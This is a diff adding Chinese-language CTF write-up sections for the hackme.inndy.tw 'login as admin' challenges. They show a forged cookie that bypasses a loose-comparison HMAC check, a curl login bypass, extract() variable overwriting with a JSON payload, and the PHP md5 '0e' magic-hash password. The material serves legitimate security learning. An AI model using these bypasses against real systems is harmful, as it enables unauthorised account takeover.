@@ -228,3 +228,71 @@ def tamper(payload, **kwargs):
 
 我们总算是逃脱了 SQL 注入的苦海😂。
 
+查看源代码，发现加入了 `cookie` 验证。我们不知道 `$secret` 的内容。但可以注意到，校验 `cookie` 的关键语句是：
+
+```php
+hash_hmac('sha512', $unserialized['data'], $secret) != $unserialized['sig']
+```
+
+函数 `hash_hmac()` 返回字符串，而这里使用了弱类型比较（`!=`）。如果 `$unserialized['sig']` 为 0，那么只要 `hash_hmac()` 返回值不会被转换为 0，那么这个条件就不会成立。
+
+所以 `json` 为：
+
+```json
+{"sig":0,"data":"[\"admin\",true]"}
+```
+
+转换为 `cookie`：
+
+```
+eyJzaWciOjAsImRhdGEiOiJbXCJhZG1pblwiLHRydWVdIn0=
+```
+
+在登录页面设置 `document.cookie`，刷新即可。
+
+## 23: login as admin 4
+
+可以注意到，当密码错误时，代码会改变 `header`，试图将用户导向错误页面，但之后的校验只检查了用户名。
+
+所以直接用 `curl` 访问。
+
+```shell
+curl -d "name=admin&password=a" https://hackme.inndy.tw/login4/
+```
+
+## 24: login as admin 6
+
+```php
+if(!empty($_POST['data'])) {
+    try {
+        $data = json_decode($_POST['data'], true);
+    } catch (Exception $e) {
+        $data = [];
+    }
+    extract($data);
+    if($users[$username] && strcmp($users[$username], $password) == 0) {
+        $user = $username;
+    }
+}
+```
+
+注意到 `extract()`，由于实际上我们可以修改 `$_POST['data']` 的内容，所以在这里可以变量覆盖 `$users`。
+
+最终 `data` 为：
+
+```json
+data={"users":{"admin":"admin"},"username":"admin","password":"admin"}
+```
+
+`urlencode` 一下就行。
+
+## 25: login as admin 7
+
+就是 PHP 的 md5 漏洞，都变成套路了 2333333。
+
+不知道是什么的话搜索 `php md5 0e`。
+
+密码 `QNKCDZO`，登录即可。
+
+## 26: dafuq-manager 1
+
